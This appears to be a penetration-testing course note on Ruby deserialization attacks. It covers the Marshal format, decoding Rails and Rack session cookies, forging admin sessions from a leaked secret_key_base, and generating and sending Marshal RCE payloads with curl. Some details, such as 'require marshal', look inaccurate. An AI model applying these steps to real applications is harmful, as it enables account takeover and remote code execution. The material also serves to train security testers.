---
tags: [vapt, deserialization, ruby, advanced]
difficulty: advanced
module: "15 - Deserialization"
topic: "15.06 Ruby Deserialization"
---

# 15.06 — Ruby Deserialization

## Ruby Marshal Format

```ruby
# Ruby's built-in serialization:
require 'marshal'

user = {name: "alice", role: "user", admin: false}
serialized = Marshal.dump(user)    # → binary string
deserialized = Marshal.load(serialized)  # → Ruby object back

# MARSHAL FORMAT:
# Starts with: \x04\x08 (0x04 = format version, 0x08 = minor)

# IN HTTP:
# Often base64 encoded in cookies
# Starts with: BAh... (base64 of \x04\x08...)
```

---

## Ruby Marshal RCE via Gadget Chains

```ruby
# RUBY DOESN'T HAVE __reduce__ LIKE PYTHON
# BUT: Gadget chains exist using standard Ruby classes

# THE CLASSIC Ruby RCE GADGET:
# Uses: DL::Win32Types (or Fiddle::Function in newer Ruby)
# Chains through: Hash → {}.compare_by_identity → triggers method calls
# Eventually: Kernel#spawn, IO#popen, or system() call

# SIMPLIFIED CONCEPT:
# Ruby gadget chains use legitimate Ruby core classes whose
# deserialization methods happen to trigger dangerous operations
# when crafted in a certain way.

# COMMON GADGET PATHS:
# Ruby 2.x → Gem/Rack gadget chains
# Rails → ActiveSupport serializer chains

# TOOL: universal-deserializer-exploit for Ruby:
# https://github.com/httpvoid/hashproxy
```

---

## Finding Ruby Deserialization

```bash
# LOOK FOR BASE64 STRINGS STARTING WITH "BAh":
# BAh7... → hash object
# BAhv... → object
# BAl... → array

# IN COOKIES:
curl -v "https://railsapp.com/" 2>&1 | grep -i "set-cookie" | grep "BAh"

# RAILS COOKIE STORE:
# Default Rails session cookie is signed (HMAC) and/or encrypted
# If signed only → can decode but not modify without key
# If compromised key → forge sessions → modify objects

# DECODE A RAILS COOKIE:
ruby -r base64 -r marshal -e "
cookie = 'YOUR_COOKIE_HERE'
# Rails cookie format: data--signature
data = cookie.split('--').first
decoded = Base64.strict_decode64(data.gsub('%3D', '='))
puts Marshal.load(decoded).inspect
" 2>/dev/null

# RAILS SIGNED COOKIE KEY:
# Located in: config/secrets.yml, config/credentials.yml.enc, .env
# If you find the secret_key_base → forge any session!
```

---

## Forging Rails Sessions

```ruby
# IF YOU HAVE secret_key_base (from source code or config):
# You can create admin sessions!

# STEP 1: GET THE SECRET KEY
# config/secrets.yml:
# production:
#   secret_key_base: d4f0...long_key...

# STEP 2: FORGE ADMIN SESSION USING THE KEY:
require 'active_support'
require 'active_support/message_verifier'

secret_key_base = "d4f0...long_key..."
key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)

salt = 'encrypted cookie'
secret = key_generator.generate_key(salt)[0, 32]
sign_secret = key_generator.generate_key('signed encrypted cookie')

# Create malicious session:
session_data = {
  "user_id" => 1,
  "admin" => true,
  "role" => "admin"
}

# Sign and encode...
# (use rails-session-cookie-forge gem for automation)

# AUTOMATED TOOL: rails-session-cookie-forge
gem install rails-session-cookie-forge
forge_cookie --secret-key "d4f0..." --data '{"admin":true,"user_id":1}'
```

---

## Ruby Marshal Gadget with universal-deserializer

```bash
# TOOL: universal-deserializer-exploit
# Generates Ruby Marshal payloads for RCE

git clone https://github.com/httpvoid/hashproxy
cd hashproxy

# GENERATE PAYLOAD:
ruby generate.rb "id"
# → outputs base64 Ruby Marshal payload

# TEST:
ruby -e "
require 'base64'
require 'marshal'

payload = Base64.decode64('YOUR_PAYLOAD_HERE')
Marshal.load(payload)
"

# SEND TO APP:
curl "https://target.com/" \
  -H "Cookie: session=BAh...PAYLOAD..."
```

---

## Rack / Sinatra Cookie Tampering

```bash
# RACK SESSION COOKIE (Sinatra, Padrino, other Ruby web frameworks):
# rack.session cookie → stored as marshal + base64 + HMAC

# IF HMAC IS WEAK/MISSING:
# Decode → modify → re-encode → resend

# DECODE RACK SESSION:
python3 -c "
import base64, urllib.parse
cookie = urllib.parse.unquote('YOUR_COOKIE_VALUE')
# Remove the signature (after --)
data = cookie.split('--')[0]
decoded = base64.b64decode(data + '==')
print(decoded)
"

# MODIFY AND RE-ENCODE:
# (requires Ruby with the right secret to re-sign)
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[11 - Magic Methods Abuse]] — marshal_load details
- [[12 - Defense Avoid Untrusted Deserialization]] — defense
